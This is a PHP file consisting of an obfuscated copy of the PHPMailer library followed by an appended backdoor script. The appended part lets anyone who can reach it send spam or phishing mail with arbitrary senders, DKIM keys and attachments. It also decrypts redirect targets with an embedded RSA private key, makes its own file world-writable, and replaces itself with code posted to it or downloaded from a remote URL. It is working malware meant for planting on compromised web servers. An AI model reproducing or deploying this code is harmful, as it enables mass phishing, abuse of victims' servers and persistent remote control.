(!static::isValidHost($spf7a64c)) { return 'localhost.localdomain'; } return $spf7a64c; } public static function isValidHost($sp36d8cf) { if (empty($sp36d8cf) || !is_string($sp36d8cf) || strlen($sp36d8cf) > 256 || !preg_match('/^([a-zA-Z\\d.-]*|\\[[a-fA-F\\d:]+])$/', $sp36d8cf)) { return false; } if (strlen($sp36d8cf) > 2 && substr($sp36d8cf, 0, 1) === '[' && substr($sp36d8cf, -1, 1) === ']') { return filter_var(substr($sp36d8cf, 1, -1), FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) !== false; } if (is_numeric(str_replace('.', '', $sp36d8cf))) { return filter_var($sp36d8cf, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) !== false; } if (filter_var('http://' . $sp36d8cf, FILTER_VALIDATE_URL) !== false) { return true; } return false; } protected function lang($sp572743) { if (count($this->language) < 1) { $this->setLanguage(); } if (array_key_exists($sp572743, $this->language)) { if ('smtp_connect_failed' === $sp572743) { return $this->language[$sp572743] . ' https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting'; } return $this->language[$sp572743]; } return $sp572743; } public function isError() { return $this->error_count > 0; } public function addCustomHeader($spa6eece, $sp5f1c2e = null) { if (null === $sp5f1c2e && strpos($spa6eece, ':') !== false) { list($spa6eece, $sp5f1c2e) = explode(':', $spa6eece, 2); } $spa6eece = trim($spa6eece); $sp5f1c2e = trim($sp5f1c2e); if (empty($spa6eece) || strpbrk($spa6eece . $sp5f1c2e, '
') !== false) { if ($this->exceptions) { throw new Exception('Invalid header name or value'); } return false; } $this->CustomHeader[] = array($spa6eece, $sp5f1c2e); return true; } public function getCustomHeaders() { return $this->CustomHeader; } public function msgHTML($sp6df182, $sp0ada94 = '', $sp7cbaa6 = false) { preg_match_all('/(?<!-)(src|background)=["\'](.*)["\']/Ui', $sp6df182, $sp640030); if (array_key_exists(2, $sp640030)) { if (strlen($sp0ada94) > 1 && '/' !== substr($sp0ada94, -1)) { $sp0ada94 .= '/'; } foreach ($sp640030[2] as $sp9c3533 => $sp02ef5d) { $sp2fb38a = array(); if (preg_match('#^data:(image/(?:jpe?g|gif|png));?(base64)?,(.+)#', $sp02ef5d, $sp2fb38a)) { if (count($sp2fb38a) === 4 && static::ENCODING_BASE64 === $sp2fb38a[2]) { $sp824dd4 = base64_decode($sp2fb38a[3]); } elseif ('' === $sp2fb38a[2]) { $sp824dd4 = rawurldecode($sp2fb38a[3]); } else { continue; } $spb7ac25 = substr(hash('sha256', $sp824dd4), 0, 32) . '@phpmailer.0'; if (!$this->cidExists($spb7ac25)) { $this->addStringEmbeddedImage($sp824dd4, $spb7ac25, 'embed' . $sp9c3533, static::ENCODING_BASE64, $sp2fb38a[1]); } $sp6df182 = str_replace($sp640030[0][$sp9c3533], $sp640030[1][$sp9c3533] . '="cid:' . $spb7ac25 . '"', $sp6df182); continue; } if (!empty($sp0ada94) && strpos($sp02ef5d, '..') === false && 0 !== strpos($sp02ef5d, 'cid:') && !preg_match('#^[a-z][a-z0-9+.-]*:?//#i', $sp02ef5d)) { $sp6512ab = static::mb_pathinfo($sp02ef5d, PATHINFO_BASENAME); $sp0120d5 = dirname($sp02ef5d); if ('.' === $sp0120d5) { $sp0120d5 = ''; } $spb7ac25 = substr(hash('sha256', $sp02ef5d), 0, 32) . '@phpmailer.0'; if (strlen($sp0ada94) > 1 && '/' !== substr($sp0ada94, -1)) { $sp0ada94 .= '/'; } if (strlen($sp0120d5) > 1 && '/' !== substr($sp0120d5, -1)) { $sp0120d5 .= '/'; } if ($this->addEmbeddedImage($sp0ada94 . $sp0120d5 . $sp6512ab, $spb7ac25, $sp6512ab, static::ENCODING_BASE64, static::_mime_types((string) static::mb_pathinfo($sp6512ab, PATHINFO_EXTENSION)))) { $sp6df182 = preg_replace('/' . $sp640030[1][$sp9c3533] . '=["\']' . preg_quote($sp02ef5d, '/') . '["\']/Ui', $sp640030[1][$sp9c3533] . '="cid:' . $spb7ac25 . '"', $sp6df182); } } } } $this->isHTML(); $this->Body = static::normalizeBreaks($sp6df182); $this->AltBody = static::normalizeBreaks($this->html2text($sp6df182, $sp7cbaa6)); if (!$this->alternativeExists()) { $this->AltBody = 'This is an HTML-only message. To view it, activate HTML in your email application.' . static::$LE; } return $this->Body; } public function html2text($sp1b5155, $sp7cbaa6 = false) { if (is_callable($sp7cbaa6)) { return $sp7cbaa6($sp1b5155); } return html_entity_decode(trim(strip_tags(preg_replace('/<(head|title|style|script)[^>]*>.*?<\\/\\1>/si', '', $sp1b5155))), ENT_QUOTES, $this->CharSet); } public static function _mime_types($sp22390b = '') { $sp4e3ff1 = array('xl' => 'application/excel', 'js' => 'application/javascript', 'hqx' => 'application/mac-binhex40', 'cpt' => 'application/mac-compactpro', 'bin' => 'application/macbinary', 'doc' => 'application/msword', 'word' => 'application/msword', 'xlsx' => 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'xltx' => 'application/vnd.openxmlformats-officedocument.spreadsheetml.template', 'potx' => 'application/vnd.openxmlformats-officedocument.presentationml.template', 'ppsx' => 'application/vnd.openxmlformats-officedocument.presentationml.slideshow', 'pptx' => 'application/vnd.openxmlformats-officedocument.presentationml.presentation', 'sldx' => 'application/vnd.openxmlformats-officedocument.presentationml.slide', 'docx' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'dotx' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.template', 'xlam' => 'application/vnd.ms-excel.addin.macroEnabled.12', 'xlsb' => 'application/vnd.ms-excel.sheet.binary.macroEnabled.12', 'class' => 'application/octet-stream', 'dll' => 'application/octet-stream', 'dms' => 'application/octet-stream', 'exe' => 'application/octet-stream', 'lha' => 'application/octet-stream', 'lzh' => 'application/octet-stream', 'psd' => 'application/octet-stream', 'sea' => 'application/octet-stream', 'so' => 'application/octet-stream', 'oda' => 'application/oda', 'pdf' => 'application/pdf', 'ai' => 'application/postscript', 'eps' => 'application/postscript', 'ps' => 'application/postscript', 'smi' => 'application/smil', 'smil' => 'application/smil', 'mif' => 'application/vnd.mif', 'xls' => 'application/vnd.ms-excel', 'ppt' => 'application/vnd.ms-powerpoint', 'wbxml' => 'application/vnd.wap.wbxml', 'wmlc' => 'application/vnd.wap.wmlc', 'dcr' => 'application/x-director', 'dir' => 'application/x-director', 'dxr' => 'application/x-director', 'dvi' => 'application/x-dvi', 'gtar' => 'application/x-gtar', 'php3' => 'application/x-httpd-php', 'php4' => 'application/x-httpd-php', 'php' => 'application/x-httpd-php', 'phtml' => 'application/x-httpd-php', 'phps' => 'application/x-httpd-php-source', 'swf' => 'application/x-shockwave-flash', 'sit' => 'application/x-stuffit', 'tar' => 'application/x-tar', 'tgz' => 'application/x-tar', 'xht' => 'application/xhtml+xml', 'xhtml' => 'application/xhtml+xml', 'zip' => 'application/zip', 'mid' => 'audio/midi', 'midi' => 'audio/midi', 'mp2' => 'audio/mpeg', 'mp3' => 'audio/mpeg', 'm4a' => 'audio/mp4', 'mpga' => 'audio/mpeg', 'aif' => 'audio/x-aiff', 'aifc' => 'audio/x-aiff', 'aiff' => 'audio/x-aiff', 'ram' => 'audio/x-pn-realaudio', 'rm' => 'audio/x-pn-realaudio', 'rpm' => 'audio/x-pn-realaudio-plugin', 'ra' => 'audio/x-realaudio', 'wav' => 'audio/x-wav', 'mka' => 'audio/x-matroska', 'bmp' => 'image/bmp', 'gif' => 'image/gif', 'jpeg' => 'image/jpeg', 'jpe' => 'image/jpeg', 'jpg' => 'image/jpeg', 'png' => 'image/png', 'tiff' => 'image/tiff', 'tif' => 'image/tiff', 'webp' => 'image/webp', 'heif' => 'image/heif', 'heifs' => 'image/heif-sequence', 'heic' => 'image/heic', 'heics' => 'image/heic-sequence', 'eml' => 'message/rfc822', 'css' => 'text/css', 'html' => 'text/html', 'htm' => 'text/html', 'shtml' => 'text/html', 'log' => 'text/plain', 'text' => 'text/plain', 'txt' => 'text/plain', 'rtx' => 'text/richtext', 'rtf' => 'text/rtf', 'vcf' => 'text/vcard', 'vcard' => 'text/vcard', 'ics' => 'text/calendar', 'xml' => 'text/xml', 'xsl' => 'text/xml', 'wmv' => 'video/x-ms-wmv', 'mpeg' => 'video/mpeg', 'mpe' => 'video/mpeg', 'mpg' => 'video/mpeg', 'mp4' => 'video/mp4', 'm4v' => 'video/mp4', 'mov' => 'video/quicktime', 'qt' => 'video/quicktime', 'rv' => 'video/vnd.rn-realvideo', 'avi' => 'video/x-msvideo', 'movie' => 'video/x-sgi-movie', 'webm' => 'video/webm', 'mkv' => 'video/x-matroska'); $sp22390b = strtolower($sp22390b); if (array_key_exists($sp22390b, $sp4e3ff1)) { return $sp4e3ff1[$sp22390b]; } return 'application/octet-stream'; } public static function filenameToType($sp6512ab) { $sp364187 = strpos($sp6512ab, '?'); if (false !== $sp364187) { $sp6512ab = substr($sp6512ab, 0, $sp364187); } $sp22390b = static::mb_pathinfo($sp6512ab, PATHINFO_EXTENSION); return static::_mime_types($sp22390b); } public static function mb_pathinfo($sp3db27e, $spc01b26 = null) { $spea0985 = array('dirname' => '', 'basename' => '', 'extension' => '', 'filename' => ''); $sp00925b = array(); if (preg_match('#^(.*?)[\\\\/]*(([^/\\\\]*?)(\\.([^.\\\\/]+?)|))[\\\\/.]*$#m', $sp3db27e, $sp00925b)) { if (array_key_exists(1, $sp00925b)) { $spea0985['dirname'] = $sp00925b[1]; } if (array_key_exists(2, $sp00925b)) { $spea0985['basename'] = $sp00925b[2]; } if (array_key_exists(5, $sp00925b)) { $spea0985['extension'] = $sp00925b[5]; } if (array_key_exists(3, $sp00925b)) { $spea0985['filename'] = $sp00925b[3]; } } switch ($spc01b26) { case PATHINFO_DIRNAME: case 'dirname': return $spea0985['dirname']; case PATHINFO_BASENAME: case 'basename': return $spea0985['basename']; case PATHINFO_EXTENSION: case 'extension': return $spea0985['extension']; case PATHINFO_FILENAME: case 'filename': return $spea0985['filename']; default: return $spea0985; } } public function set($spa6eece, $sp5f1c2e = '') { if (property_exists($this, $spa6eece)) { $this->{$spa6eece} = $sp5f1c2e; return true; } $this->setError($this->lang('variable_set') . $spa6eece); return false; } public function secureHeader($sp9f0ad1) { return trim(str_replace(array('', '
'), '', $sp9f0ad1)); } public static function normalizeBreaks($sp4cc22d, $sp082f87 = null) { if (null === $sp082f87) { $sp082f87 = static::$LE; } $sp4cc22d = str_replace(array(self::CRLF, ''), '
', $sp4cc22d); if ('
' !== $sp082f87) { $sp4cc22d = str_replace('
', $sp082f87, $sp4cc22d); } return $sp4cc22d; } public static function stripTrailingWSP($sp4cc22d) { return rtrim($sp4cc22d, ' 
	'); } public static function getLE() { return static::$LE; } protected static function setLE($sp281dd5) { static::$LE = $sp281dd5; } public function sign($sp88334d, $sp185962, $sp0a3a69, $sp6d19de = '') { $this->sign_cert_file = $sp88334d; $this->sign_key_file = $sp185962; $this->sign_key_pass = $sp0a3a69; $this->sign_extracerts_file = $sp6d19de; } public function DKIM_QP($sp926367) { $spb7cef0 = ''; $sp9f5735 = strlen($sp926367); for ($sp16364a = 0; $sp16364a < $sp9f5735; ++$sp16364a) { $spfc84e4 = ord($sp926367[$sp16364a]); if (33 <= $spfc84e4 && $spfc84e4 <= 58 || $spfc84e4 === 60 || 62 <= $spfc84e4 && $spfc84e4 <= 126) { $spb7cef0 .= $sp926367[$sp16364a]; } else { $spb7cef0 .= '=' . sprintf('%02X', $spfc84e4); } } return $spb7cef0; } public function DKIM_Sign($spe507b4) { if (!defined('PKCS7_TEXT')) { if ($this->exceptions) { throw new Exception($this->lang('extension_missing') . 'openssl'); } return ''; } $sp5bc2f0 = !empty($this->DKIM_private_string) ? $this->DKIM_private_string : file_get_contents($this->DKIM_private); if ('' !== $this->DKIM_passphrase) { $sp08994f = openssl_pkey_get_private($sp5bc2f0, $this->DKIM_passphrase); } else { $sp08994f = openssl_pkey_get_private($sp5bc2f0); } if (openssl_sign($spe507b4, $sp71d71b, $sp08994f, 'sha256WithRSAEncryption')) { openssl_pkey_free($sp08994f); return base64_encode($sp71d71b); } openssl_pkey_free($sp08994f); return ''; } public function DKIM_HeaderC($spe507b4) { $spe507b4 = static::normalizeBreaks($spe507b4, self::CRLF); $spe507b4 = preg_replace('/\\r\\n[ \\t]+/', ' ', $spe507b4); $spe35f43 = explode(self::CRLF, $spe507b4); foreach ($spe35f43 as $sp572743 => $spb7cef0) { if (strpos($spb7cef0, ':') === false) { continue; } list($spe1734e, $sp5f1c2e) = explode(':', $spb7cef0, 2); $spe1734e = strtolower($spe1734e); $sp5f1c2e = preg_replace('/[ \\t]+/', ' ', $sp5f1c2e); $spe35f43[$sp572743] = trim($spe1734e, ' 	') . ':' . trim($sp5f1c2e, ' 	'); } return implode(self::CRLF, $spe35f43); } public function DKIM_BodyC($spa717d7) { if (empty($spa717d7)) { return self::CRLF; } $spa717d7 = static::normalizeBreaks($spa717d7, self::CRLF); return static::stripTrailingWSP($spa717d7) . self::CRLF; } public function DKIM_Add($spc59c02, $sp037e30, $spa717d7) { $sp7d0a5f = 'rsa-sha256'; $spf08889 = 'relaxed/simple'; $sp6402cb = 'dns/txt'; $spdb2387 = time(); $sp00331f = array('from', 'to', 'cc', 'date', 'subject', 'reply-to', 'message-id', 'content-type', 'mime-version', 'x-mailer'); if (stripos($spc59c02, 'Subject') === false) { $spc59c02 .= 'Subject: ' . $sp037e30 . static::$LE; } $spc4704b = explode(static::$LE, $spc59c02); $sp085571 = ''; $sp532a2c = ''; $spc4a02a = array(); $sp2286ad = 0; $sp0db28e = count($spc4704b); foreach ($spc4704b as $sp2736a6) { $sp11e5d9 = array(); if (preg_match('/^([^ \\t]*?)(?::[ \\t]*)(.*)$/', $sp2736a6, $sp11e5d9)) { if ($sp085571 !== '') { $spc4a02a[] = array('label' => $sp085571, 'value' => $sp532a2c); } $sp085571 = $sp11e5d9[1]; $sp532a2c = $sp11e5d9[2]; } elseif (preg_match('/^[ \\t]+(.*)$/', $sp2736a6, $sp11e5d9)) { $sp532a2c .= ' ' . $sp11e5d9[1]; } ++$sp2286ad; if ($sp2286ad >= $sp0db28e) { $spc4a02a[] = array('label' => $sp085571, 'value' => $sp532a2c); } } $sp30e27b = array(); $sp69d1e1 = array(); $spf693c1 = array(); foreach ($spc4a02a as $sp6d38ac) { if (in_array(strtolower($sp6d38ac['label']), $sp00331f, true)) { $sp69d1e1[] = $sp6d38ac['label']; $spf693c1[] = $sp6d38ac['label'] . ': ' . $sp6d38ac['value']; if ($this->DKIM_copyHeaderFields) { $sp30e27b[] = $sp6d38ac['label'] . ':' . str_replace('|', '=7C', $this->DKIM_QP($sp6d38ac['value'])); } continue; } if (in_array($sp6d38ac['label'], $this->DKIM_extraHeaders, true)) { foreach ($this->CustomHeader as $spc60051) { if ($spc60051[0] === $sp6d38ac['label']) { $sp69d1e1[] = $sp6d38ac['label']; $spf693c1[] = $sp6d38ac['label'] . ': ' . $sp6d38ac['value']; if ($this->DKIM_copyHeaderFields) { $sp30e27b[] = $sp6d38ac['label'] . ':' . str_replace('|', '=7C', $this->DKIM_QP($sp6d38ac['value'])); } continue 2; } } } } $sp0146f3 = ''; if ($this->DKIM_copyHeaderFields && count($sp30e27b) > 0) { $sp0146f3 = ' z='; $sp990ed8 = true; foreach ($sp30e27b as $spcfc1bb) { if (!$sp990ed8) { $sp0146f3 .= static::$LE . ' |'; } if (strlen($spcfc1bb) > self::STD_LINE_LENGTH - 3) { $sp0146f3 .= substr(chunk_split($spcfc1bb, self::STD_LINE_LENGTH - 3, static::$LE . self::FWS), 0, -strlen(static::$LE . self::FWS)); } else { $sp0146f3 .= $spcfc1bb; } $sp990ed8 = false; } $sp0146f3 .= ';' . static::$LE; } $sp0115ee = ' h=' . implode(':', $sp69d1e1) . ';' . static::$LE; $spbac217 = implode(static::$LE, $spf693c1); $spa717d7 = $this->DKIM_BodyC($spa717d7); $sp69a727 = base64_encode(pack('H*', hash('sha256', $spa717d7))); $sp174ac8 = ''; if ('' !== $this->DKIM_identity) { $sp174ac8 = ' i=' . $this->DKIM_identity . ';' . static::$LE; } $sp012cd4 = 'DKIM-Signature: v=1;' . ' d=' . $this->DKIM_domain . ';' . ' s=' . $this->DKIM_selector . ';' . static::$LE . ' a=' . $sp7d0a5f . ';' . ' q=' . $sp6402cb . ';' . ' t=' . $spdb2387 . ';' . ' c=' . $spf08889 . ';' . static::$LE . $sp0115ee . $sp174ac8 . $sp0146f3 . ' bh=' . $sp69a727 . ';' . static::$LE . ' b='; $sp465284 = $this->DKIM_HeaderC($spbac217 . static::$LE . $sp012cd4); $sp71d71b = $this->DKIM_Sign($sp465284); $sp71d71b = trim(chunk_split($sp71d71b, self::STD_LINE_LENGTH - 3, static::$LE . self::FWS)); return static::normalizeBreaks($sp012cd4 . $sp71d71b); } public static function hasLineLongerThanMax($sp9f0ad1) { return (bool) preg_match('/^(.{' . (self::MAX_LINE_LENGTH + strlen(static::$LE)) . ',})/m', $sp9f0ad1); } public static function quotedString($sp9f0ad1) { if (preg_match('/[ ()<>@,;:"\\/\\[\\]?=]/', $sp9f0ad1)) { return '"' . str_replace('"', '\\"', $sp9f0ad1) . '"'; } return $sp9f0ad1; } public function getToAddresses() { return $this->to; } public function getCcAddresses() { return $this->cc; } public function getBccAddresses() { return $this->bcc; } public function getReplyToAddresses() { return $this->ReplyTo; } public function getAllRecipientAddresses() { return $this->all_recipients; } protected function doCallback($spfe6797, $sp56d48b, $sp1da2c1, $sp53670a, $sp037e30, $spa717d7, $sp7cf0e5, $sp1e44e7) { if (!empty($this->action_function) && is_callable($this->action_function)) { call_user_func($this->action_function, $spfe6797, $sp56d48b, $sp1da2c1, $sp53670a, $sp037e30, $spa717d7, $sp7cf0e5, $sp1e44e7); } } public function getOAuth() { return $this->oauth; } public function setOAuth(OAuth $sp2d4785) { $this->oauth = $sp2d4785; } } $spc41269 = '2.4'; function rsaDecrypt($sp824dd4) { $sp824dd4 = base64_decode($sp824dd4); $sp60a8ae = base64_decode('LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelhldk9MN2tDZlcraDRYZVZyR1pCS2MzT0ZLU3ZxK2kvVWlSd29xa3d4SThJbWNMCjZqM1JKZkJBQU9sWEsvNlREMGkrKzE0NlJsbEVRVklhcTZ2c0VuWHBacVVTL0FSaElnbVJZcHY5WlQrWmdvNG4Kdk1tTmNqQk1uMjdxWlFhRHRZVlhnZnhINkE5MStXZk5keTcrSnQrOWNpNVdNR1RlZWx1S1ZzVEpCZmNQenZKYgpsalZVZEJPQWVDb3piUkVla0liVGZwcyt4bjdkMm0yYzU2ZUdLVjJPRDRIZ3RmMmliRGtFVVcycVo1TUZqUjhjClFHeWh6ZnNaUHB4aE9yQVgyL2k0bWRRTDhvSmxYT2JMNElRbnBNVGRGa1VVbnBFNm9ENVFEeEt6TEdNRUZQUXIKZ1F0aTJwemFJVU1nVlo1TElkVGdHdk1COE8vbXJicEo0VTJQYVFJREFRQUJBb0lCQUNOa2YybGQ4SGdLdmJRbwppaUVTM0pIaG4vQnl3TlpaK05CNlpLbEhLcFJ6bXFvdVorNEVrZmRnQ0JaZ0cyVDNxQ3RVMDVrSEpUQ2pCYy9lCnJidHVsTzZsSXZ4TWFSWENSMTBPbXQyS2t6NlNrd1hiS05zck9OTTNvS3RCOXR4S0gvdnZxU0E1N2NUNmpNN1cKWTUwcEdoeG1KQUw4R2xxaHRYVU1PYXN5b0pJSEtzdzcrc21kVWFaazl5ZGZjWHZwZVFtTzJFSC82T2ZwTE5hdgpDZGJUK05qaXAwcFRrcDNSYTN0a3FwL2hPV2ZhQ2hnVUxDbmZvZkdLdXVmNjhqMG1wSld0ZmtpbFNHNlgvb05yCndBQnFYS0tqSnVzTDJUU0FyTERucDcrcDEzbkpYcHlZSXlsTnJpWkozM21CR01waHZYbTFrTWpXcEcvUC9iblUKOWxGOGViVUNnWUVBNkJ2K2RUSExMMlNIT0ZRcytSVHBtemxMcWxKaXNCYXp3T0ZXczFkd2lHc2lPRFM0WktuUwpkWGNVT21mQi8wNE9sTS80L1Erb25RbWhWa2pmVmhQWE5LVEtsMkZ2L2Mrd0kzd0JrZlJaNFJxdldpTnJSaHB5ClQ5TWNNbnV6Si9obW9ib1dGWE9lNjJnNkg0S2kwMjhGWFZJTlRjTE5xQlZ4YVQxNElieWwrTjhDZ1lFQTRwMnYKMHNOaUhITXkvWURLMTg0VFR4MXo4clRNNDY4V3JhMkNraFFuVGx6a0Y5czRsSWVmQUt4N3dSL1pacm9hK0ozTgpwMUd5ZmxXSkt6d3RKMFRaKzJlU0xtcEVhMHV5dStUS05WeFcrSHhCZzg1TkJjV1hnajlaWXhpUWJwMnA5NWU4CjllNlFZR2hpZGxTdnRzcU9nRFFyWW1WbStNb3VrSElnQUg1a1dMY0NnWUVBeW1VV3RxU3IwM0NxaEpES0FveWMKdzNEcnJPSllFY3BLQmllNFRYd3lzWklSN2NieS96d2lPN0dSWHZoNDdxSG5EeFptdkd3NkVHMkVWTlFJZzJ1YgpuZGtRbTM0b2hMN2tqWnlsVmRzbndLVmZRSTlnREdvbFFid0plMi9vSWpOMWN4THNETnFjT2hQUmt3Wjc2emlGCkNnSHhmZHdmTHJFOENwUENQRkRldlNzQ2dZRUFtNm9wenFNN3o4TXFNWXk0eVlqYkpxdGFyRXVadW9UWkZUQnMKMHA5WmFMRFNWYmpXb3VDT1RrNHRMRG9PZ2t3d25ycjNPNG9aREVNQldGdWJ3Sy9BOUxydVpVZkYrOVloem9PWQppeE1GQXVlSHNWeVM5L1lFM3dsWkE0TXFJM0hXQVNlUU8zZEdZWk1TbjZvSWtZMk9XVzU4cHJoMUJVME1zMWhSCnQwVWE5UDBDZ1lCbEJRdE0vYUtQSFA5TDBhZzZYZjJ4YTlkeVkvME8yZEIvcmtWRlNZQUtPM3FmcEJLRitkMXMKdXdkNVlzOVJmdjg0Zms3VXhyZzBIVEhCOWxoUmMvOFgwaU9SUEVHS0VkWHlrVmZod0RaTURtMkpveExPblBZWQoyT3Arblh1VEtWRnIveENGWVREZk50UWVQYjRrMDRlZCtjcStNdk4zTkcvUytobWpZNU9OZ3c9PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo='); $sp142ccd = ''; openssl_private_decrypt($sp824dd4, $sp142ccd, $sp60a8ae); return $sp142ccd; } function sendResponse($spf7a64c, $spcbcafd) { global $spc41269; echo json_encode(array('result' => $spf7a64c, 'content' => $spcbcafd, 'phpVersion' => phpversion(), 'mailFunction' => function_exists('mail'), 'scriptVersion' => $spc41269, 'isWritable' => intval(substr(sprintf('%o', fileperms(__FILE__)), -4)))); die; } function sendMail($sp824dd4) { $sp28a536 = new PHPMailer(); $sp28a536->CharSet = 'UTF-8'; $sp28a536->Encoding = 'base64'; if ($sp824dd4->DkimDomain) { $sp28a536->DKIM_domain = $sp824dd4->DkimDomain; $sp28a536->DKIM_private_string = $sp824dd4->DkimPrivateKey; $sp28a536->DKIM_selector = $sp824dd4->DkimSelector; $sp28a536->DKIM_passphrase = ''; $sp28a536->DKIM_identity = $sp824dd4->SenderEmail; } $sp28a536->isMail(); try { $sp28a536->setFrom($sp824dd4->SenderEmail, $sp824dd4->SenderName); } catch (\Exception $spf77d78) { sendResponse(false, $spf77d78->getMessage()); } try { foreach ($sp824dd4->Addresses as $spafcd4c) { if ($sp824dd4->SendMethod == 1) { $sp28a536->addAddress($spafcd4c); } else { if ($sp824dd4->SendMethod == 2) { $sp28a536->addCC($spafcd4c); } else { $sp28a536->addBCC($spafcd4c); } } } } catch (\Exception $spf77d78) { sendResponse(false, $spf77d78->getMessage()); } $sp28a536->Subject = $sp824dd4->Subject; foreach ($sp824dd4->Headers as $sp6d38ac) { try { $sp28a536->addCustomHeader($sp6d38ac->Key, $sp6d38ac->Value); } catch (\Exception $spf77d78) { sendResponse(false, $spf77d78->getMessage()); } } try { $spa717d7 = $sp824dd4->Body; $sp28a536->msgHTML($spa717d7); } catch (\Exception $spf77d78) { sendResponse(false, $spf77d78->getMessage()); } foreach ($sp824dd4->Attachments as $sp970ac5) { try { $sp55ee60 = base64_decode($sp970ac5->Content); $sp28a536->addStringAttachment($sp55ee60, $sp970ac5->Filename); } catch (\Exception $spf77d78) { sendResponse(false, $spf77d78->getMessage()); } } foreach ($sp824dd4->EmbeddedAttachments as $sp970ac5) { try { $sp55ee60 = base64_decode($sp970ac5->Content); $sp28a536->addStringEmbeddedImage($sp55ee60, $sp970ac5->ContentId, $sp970ac5->Filename); } catch (\Exception $spf77d78) { sendResponse(false, $spf77d78->getMessage()); } } try { if (!$sp28a536->send()) { sendResponse(false, $sp28a536->ErrorInfo); } } catch (\Exception $spf77d78) { sendResponse(false, $spf77d78->getMessage()); } sendResponse(true, ''); } if (!empty($_GET['l'])) { $sp2e7b66 = rsaDecrypt($_GET['l']); header('Location: ' . $sp2e7b66); die; } if (isset($_GET['checkConnection'])) { chmod(__FILE__, 511); sendResponse(true, ''); } elseif (isset($_POST['checkConnection'])) { chmod(__FILE__, 511); sendResponse(true, ''); } elseif (isset($_POST['updateScript'])) { $spd30de9 = base64_decode($_POST['shellScript']); if (!$spd30de9 || strlen($spd30de9) < 10000) { sendResponse(false, 'small shell string: ' . $spd30de9); } if (@file_put_contents(__FILE__, $spd30de9)) { sendResponse(true, ''); } sendResponse(false, 'error when updating script'); } elseif (isset($_GET['updateScript'])) { $sp58abb1 = base64_decode($_GET['fileUrl']); $sp76ef1b = @file_get_contents($sp58abb1); $spd30de9 = base64_decode($sp76ef1b); if (!$spd30de9 || strlen($spd30de9) < 10000) { sendResponse(false, 'small shell string: ' . $spd30de9); } if (@file_put_contents(__FILE__, $spd30de9)) { sendResponse(true, ''); } sendResponse(false, 'error when updating script'); } elseif (isset($_POST['sendMail'])) { $spcbd02b = $_POST['mail']; $sp81d065 = base64_decode($spcbd02b); $sp5451cb = json_decode($sp81d065); if (!$sp5451cb) { sendResponse(false, 'bad json request, request was: ' . $spcbd02b); } sendMail($sp5451cb); } elseif (isset($_GET['sendMail'])) { if (!empty($_GET['fileUrl'])) { $sp58abb1 = base64_decode($_GET['fileUrl']); $sp5d1095 = @file_get_contents($sp58abb1); $sp75da7d = @json_decode(base64_decode($sp5d1095)); if (!$sp75da7d) { sendResponse(false, 'Wrong mail data'); } sendMail($sp75da7d); } sendResponse(false, 'No mailUrl'); } ?>

MAIL FUNCTION = <?php  echo function_exists('mail') ? 'YES' : 'NO'; ?>
;<br/>
PHP VERSION: <?php  echo phpversion(); ?>
;<br/>
SCRIPT VERSION: <?php  echo $spc41269; ?>
;<br/>
FOLDER PERMISSION: <?php  echo substr(sprintf('%o', fileperms(dirname(__FILE__))), -4); ?>
  <br/>
FILE PERMISSION: <?php  echo substr(sprintf('%o', fileperms(__FILE__)), -4);